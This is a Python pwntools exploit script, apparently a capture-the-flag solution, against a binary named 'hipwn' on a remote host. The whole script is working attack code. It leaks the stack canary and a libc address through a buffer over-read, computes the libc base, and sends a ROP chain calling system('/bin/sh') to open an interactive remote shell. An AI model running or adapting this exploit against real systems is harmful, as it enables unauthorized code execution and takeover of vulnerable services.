from pwn import * 
r = remote('45.153.243.57', 1337)
#r = gdb.debug('./hipwn', gdbscript='break *main+267\ncontinue')
#r = process('./hipwn')
e = ELF('./hipwn')
libc = ELF('./libc.so.6')
#context.log_level = 'debug'
# may occasionally fail because of null bytes in addresses, pray that it doesn't
def leak(offset, size):
    r.recvuntil(b'How much???\n')
    padlen = offset+0x50 
    padding = b'a'*(padlen-2) + b'!\n'
    r.sendline(str(0x50+24+8).encode())
    r.recvuntil(b'content\n')
    r.send(padding)
    r.recvuntil(b'a!\n')
    data = r.recv(size)
    r.recvuntil(b'wanna do it again?\n')
    return data

canary = b'\x00' + leak(-0x7, 7)
print('canary =', canary.hex())
r.sendline(b'1337')

libc_leak = u64(leak(8, 6) + b'\x00\x00')
r.sendline(b'1337')
# not sure why the offset goes above __libc_start_main but it works so
libc.address = libc_leak + 0x30 - libc.sym['__libc_start_main'] 
print('libc.address =', hex(libc.address))

pop_rdi = libc.address + 0x000000000002a3e5
ret_gadget = libc.address + 0x0000000000029cd6
system = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh\x00'))

r.recvuntil(b'???')
payload = b'a'*(0x50-8)+canary+b'a'*8+p64(pop_rdi)+p64(bin_sh)+p64(ret_gadget)+p64(system)
r.sendline(str(len(payload)).encode())
r.recvuntil(b'content\n')
r.sendline(payload)
r.recvuntil(b'again?\n')
r.sendline(b'0')

r.interactive()
